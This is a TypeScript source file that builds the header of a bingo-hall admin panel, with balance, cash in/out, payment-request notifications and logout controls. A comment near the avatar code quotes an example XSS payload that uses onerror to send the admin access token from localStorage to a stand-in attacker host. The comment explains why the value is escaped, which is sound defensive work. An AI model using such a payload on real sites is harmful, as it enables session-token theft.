import { t } from "../i18n/I18n.js";
import type { Session } from "../auth/Session.js";
import { logout } from "../api/auth.js";
import { listPendingRequests } from "../api/paymentRequests.js";
import { escapeHtml } from "../utils/escapeHtml.js";

export function renderHeader(container: HTMLElement, session: Session, maintenanceMode: boolean): void {
  container.innerHTML = "";

  // WCAG 2.4.1 — Skip-to-main-content link (visible on focus only).
  // The link points to #main-content which is rendered by the layout.
  const skipLink = document.createElement("a");
  skipLink.href = "#main-content";
  skipLink.className = "skip-to-main";
  skipLink.textContent = t("skip_to_main_content");
  skipLink.setAttribute(
    "style",
    "position:absolute;top:-40px;left:0;background:#000;color:#fff;padding:8px 16px;z-index:100000;text-decoration:none;border-radius:0 0 6px 0;"
  );
  skipLink.addEventListener("focus", () => {
    skipLink.style.top = "0";
  });
  skipLink.addEventListener("blur", () => {
    skipLink.style.top = "-40px";
  });
  container.append(skipLink);

  const header = document.createElement("header");
  header.className = "main-header";
  header.setAttribute("role", "banner");

  // Logo
  const logo = document.createElement("a");
  logo.href = "#/admin";
  logo.className = "logo";
  logo.setAttribute("style", "background-color: #1a2226;");
  logo.setAttribute("aria-label", "Bingo Game — gå til dashboard");
  logo.innerHTML = `<span class="logo-mini" aria-hidden="true">BG</span><span class="logo-lg">Bingo Game</span>`;
  header.append(logo);

  const nav = document.createElement("nav");
  nav.className = "navbar navbar-static-top" + (maintenanceMode ? " hedarModeColor" : "");

  const toggle = document.createElement("a");
  toggle.href = "#";
  toggle.className = "sidebar-toggle";
  toggle.setAttribute("data-toggle", "push-menu");
  toggle.setAttribute("role", "button");
  toggle.innerHTML = `<span class="sr-only">Toggle navigation</span>`;
  toggle.addEventListener("click", (e) => {
    e.preventDefault();
    document.body.classList.toggle("sidebar-collapse");
  });
  nav.append(toggle);

  if (session.role === "agent" && session.hall[0]) {
    const hallLink = document.createElement("a");
    hallLink.href = "#";
    hallLink.setAttribute("style", "color:white;line-height: 3; font-size: large;");
    hallLink.textContent = session.hall[0].name;
    nav.append(hallLink);
  }

  const rightMenu = document.createElement("div");
  rightMenu.className = "navbar-custom-menu";
  const ul = document.createElement("ul");
  ul.className = "nav navbar-nav";

  // Tobias 2026-04-27: Daily balance + Cash inn/ut-knapp + Notifications-bell
  // skal vises for ALLE auth-roller (admin/super-admin/agent/hall-operator)
  // per legacy admin-skjermbilde. Tidligere ble disse kun rendret når
  // session.role === "agent" — derfor admin ikke så header-elementene.
  {
    // Daily balance
    const balLi = document.createElement("li");
    const bal = session.dailyBalance ?? 0;
    balLi.innerHTML = `<a href="javascript:void(0);" style="color:white;"><span>${escapeHtml(
      t("daily_balance")
    )} [ <span id="rootChips">${bal.toFixed(2)}</span> ]</span></a>`;
    ul.append(balLi);

    // Cash in/out
    const cashLi = document.createElement("li");
    const cashA = document.createElement("a");
    cashA.className = "btn btn-success";
    cashA.href = "#/agent/cashinout";
    cashA.setAttribute("style", "color:white;");
    cashA.textContent = t("cash_in_out");
    cashLi.append(cashA);
    ul.append(cashLi);

    // Notifications bell
    const bellLi = document.createElement("li");
    bellLi.className = "nav-item dropdown notifications-menu";
    bellLi.innerHTML = `
      <a class="nav-link" href="#" id="notificationBell">
        <i class="fa fa-bell-o" style="font-size: 20px;"></i>
        <span class="label label-warning notificationsCount">0</span>
      </a>
      <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right p-0">
        <h6 class="dropdown-header text-center" style="background: #3c8dbc; color: #fff; font-weight: 600;">Notifications</h6>
        <div class="dropdown-divider my-0"></div>
        <a href="#/deposit/requests" class="dropdown-item d-flex align-items-center py-3">
          <div class="flex-grow-1" style="padding: 5px;">
            <span>Deposit Pending</span>
            <span class="label label-warning depositPendingCount">0</span>
          </div>
        </a>
        <div class="dropdown-divider my-0"></div>
        <a href="#/withdraw/requests/hall" class="dropdown-item d-flex align-items-center py-3">
          <div class="flex-grow-1" style="padding: 5px;">
            <span>Withdraw Pending</span>
            <span class="label label-warning withdrawPendingCount">0</span>
          </div>
        </a>
      </div>`;
    const bellAnchor = bellLi.querySelector<HTMLAnchorElement>("#notificationBell");
    bellAnchor?.addEventListener("click", (e) => {
      e.preventDefault();
      bellLi.classList.toggle("open");
      void refreshNotifications(session, bellLi);
    });
    ul.append(bellLi);
    void refreshNotifications(session, bellLi);
  }

  if (maintenanceMode) {
    const mLi = document.createElement("li");
    mLi.setAttribute("style", "padding: 0 40px; top: 5px; color: #ffffff;");
    mLi.innerHTML = `<span>Maintenance Mode </span><div style="text-align:center;background-color:green;"><span> ON </span></div>`;
    ul.append(mLi);
  }

  // User dropdown
  const userLi = document.createElement("li");
  userLi.className = "dropdown user user-menu";
  // FE-P0-002 / FIN-P1-01: session.avatar comes from backend; escape it before
  // injecting into an `src=...` attribute. A malicious display-name-style
  // payload like `x" onerror="fetch('//attacker?'+localStorage.adminAccessToken)`
  // would otherwise break out of the attribute.
  const avatarSrc = session.avatar ? `/profile/${escapeHtml(session.avatar)}` : "/admin/legacy-skin/img/user.png";
  userLi.innerHTML = `
    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
      <img src="${avatarSrc}" class="img-circle" alt="User Image" width="50px" height="50px">
      <span>${escapeHtml(session.name)}</span>
    </a>
    <ul class="dropdown-menu">
      <li class="user-header">
        <img src="${avatarSrc}" class="img-circle" alt="User Image" width="50px" height="50px">
        <p>${escapeHtml(session.name)}</p>
      </li>
      <li class="user-footer">
        <div class="pull-left">
          <a href="#/profile" class="btn btn-default btn-flat">${escapeHtml(t("profile"))}</a>
        </div>
        <div class="pull-right">
          <a href="#" class="btn btn-default btn-flat" data-action="logout">${escapeHtml(t("sign_out"))}</a>
        </div>
      </li>
    </ul>`;
  const toggleAnchor = userLi.querySelector<HTMLAnchorElement>("a.dropdown-toggle");
  toggleAnchor?.addEventListener("click", (e) => {
    e.preventDefault();
    userLi.classList.toggle("open");
  });
  const logoutA = userLi.querySelector<HTMLAnchorElement>('[data-action="logout"]');
  logoutA?.addEventListener("click", async (e) => {
    e.preventDefault();
    await logout().catch(() => undefined);
    window.location.hash = "#/login";
    window.location.reload();
  });
  ul.append(userLi);

  // 2026-05-01 (Tobias): synlig logg-ut-knapp ved siden av user-dropdown.
  // Bootstrap-3-dropdown-toggle krever at bootstrap.js er lastet for å vise
  // .dropdown-menu via [data-toggle="dropdown"]. Hvis bootstrap.js mangler
  // (eller blir blokkert av strict CSP), klarer ikke brukere å logge seg ut
  // via avatar-menyen. Denne synlige knappen er en defensiv duplikat — same
  // logout-handler, samme `logout()`-call mot backend. Ufarlig om dropdown-en
  // også fungerer; brukere som kjenner dropdown-flyten kan fortsatt bruke
  // den, og brukere som ikke ser den får denne fall-back-en.
  const logoutBtnLi = document.createElement("li");
  const logoutBtn = document.createElement("a");
  logoutBtn.href = "#";
  logoutBtn.className = "btn btn-danger";
  logoutBtn.setAttribute(
    "style",
    "color: white; margin: 8px 12px 0 0; font-weight: 600;",
  );
  logoutBtn.setAttribute("data-action", "logout-direct");
  logoutBtn.setAttribute("aria-label", t("sign_out"));
  logoutBtn.innerHTML = `<i class="fa fa-sign-out" aria-hidden="true"></i> ${escapeHtml(t("sign_out"))}`;
  logoutBtn.addEventListener("click", async (e) => {
    e.preventDefault();
    await logout().catch(() => undefined);
    window.location.hash = "#/login";
    window.location.reload();
  });
  logoutBtnLi.append(logoutBtn);
  ul.append(logoutBtnLi);

  if (session.isSuperAdmin) {
    const gearLi = document.createElement("li");
    gearLi.innerHTML = `<a href="#/settings" aria-label="${t("settings")}" title="${t("settings")}"><i class="fa fa-gears" aria-hidden="true"></i></a>`;
    ul.append(gearLi);
  }

  rightMenu.append(ul);
  nav.append(rightMenu);
  header.append(nav);
  container.append(header);
}

async function refreshNotifications(session: Session, bellLi: HTMLElement): Promise<void> {
  const hallId = session.hall[0]?.id;
  try {
    const [deposits, withdraws] = await Promise.all([
      listPendingRequests({ kind: "deposit", hallId, limit: 500 }).catch(() => []),
      listPendingRequests({ kind: "withdraw", hallId, limit: 500 }).catch(() => []),
    ]);
    const depositCount = deposits.length;
    const withdrawCount = withdraws.length;
    const total = depositCount + withdrawCount;
    bellLi.querySelectorAll<HTMLElement>(".depositPendingCount").forEach((n) => (n.textContent = String(depositCount)));
    bellLi.querySelectorAll<HTMLElement>(".withdrawPendingCount").forEach((n) => (n.textContent = String(withdrawCount)));
    bellLi.querySelectorAll<HTMLElement>(".notificationsCount").forEach((n) => (n.textContent = String(total)));
  } catch {
    // silent — PAYMENT_REQUEST_READ may be missing for some operators
  }
}
